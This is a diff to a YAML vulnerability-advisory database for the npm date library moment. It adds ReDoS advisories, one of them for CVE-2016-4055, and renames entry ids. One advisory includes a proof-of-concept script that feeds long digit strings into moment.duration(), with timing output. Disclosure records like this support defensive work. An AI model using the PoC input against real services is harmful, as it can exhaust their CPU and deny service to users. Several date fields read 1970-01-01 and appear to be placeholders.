@@ -1,5 +1,86 @@
 ---
-- id: ossindex:npm:moment:2016-11-01
+- id: npmjs:npm:moment:532
+  title: Regular Expression Denial of Service
+  description: Affected versions of `moment` are vulnerable to a low severity regular
+    expression denial of service when parsing dates as strings.
+  affected_package: moment
+  vulnerable_versions:
+  - "<2.19.3"
+  severity: low
+  package_manager: npm
+  cwe: CWE-400
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Cristian-Alexandru Staicu
+  references: https://npmjs.com/advisories/532
+  source_url: https://npmjs.com/advisories/532
+- id: npmjs:npm:moment:55
+  title: Regular Expression Denial of Service
+  description: |-
+    Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.
+
+
+    ## Proof of concept
+    ```
+    var moment = require('moment');
+
+    var genstr = function (len, chr) {
+        var result = "";
+        for (i=0; i<=len; i++) {
+            result = result + chr;
+        }
+
+        return result;
+    }
+
+
+    for (i=20000;i<=10000000;i=i+10000) {
+        console.log("COUNT: " + i);
+        var str = '-' + genstr(i, '1')
+        console.log("LENGTH: " + str.length);
+        var start = process.hrtime();
+        moment.duration(str)
+
+        var end = process.hrtime(start);
+        console.log(end);
+    }
+    ```
+
+    ### Results
+    ```
+    $ node moment.js
+    COUNT: 20000
+    LENGTH: 20002
+    [ 0, 618931029 ]
+    COUNT: 30001
+    LENGTH: 30003
+    [ 1, 401413894 ]
+    COUNT: 40002
+    LENGTH: 40004
+    [ 2, 437075303 ]
+    COUNT: 50003
+    LENGTH: 50005
+    [ 3, 824664804 ]
+    COUNT: 60004
+    LENGTH: 60006
+    [ 5, 651335262 ]
+    ```
+  affected_package: moment
+  vulnerable_versions:
+  - "<2.11.2"
+  severity: moderate
+  package_manager: npm
+  cve:
+  - CVE-2016-4055
+  cwe: CWE-400
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Adam Baldwin
+  references: https://npmjs.com/advisories/55
+  source_url: https://npmjs.com/advisories/55
+- id: ossindex:npm:moment:8398655539
   title: Regular Expression Denial of Service (ReDoS)
   description: "> Via the Node Security Project: https://nodesecurity.io/advisories/55\n>
     \n> ...\n> \n> moment is vulnerable to regular expression denial of service when
@@ -20,7 +101,7 @@
   - https://nodesecurity.io/advisories/55
   - https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
   source_url: https://ossindex.net/resource/package/7014146991/vulnerabilities
-- id: ossindex:npm:moment:CVE-2016-4055
+- id: ossindex:npm:moment:8402800195
   title: "[CVE-2016-4055]  Resource Management Errors"
   description: The duration function in the moment package before 2.11.2 for Node.js
     allows remote attackers to cause a denial of service (CPU consumption) via a long
@@ -187,7 +268,7 @@
   - https://gist.github.com/grnd/50192ce22681848a7de812d95241b7fc
   - https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9
   source_url: https://snyk.io/vuln/npm:moment:20161019
-- id: snykio:npm:moment:CVE-2017-18214
+- id: snykio:npm:moment:20170905
   title: Regular Expression Denial of Service (ReDoS)
   description: "[`moment`][1] is a lightweight JavaScript date library for parsing,\nvalidating,
     manipulating, and formatting dates.\n\nAffected versions of this package are vulnerable
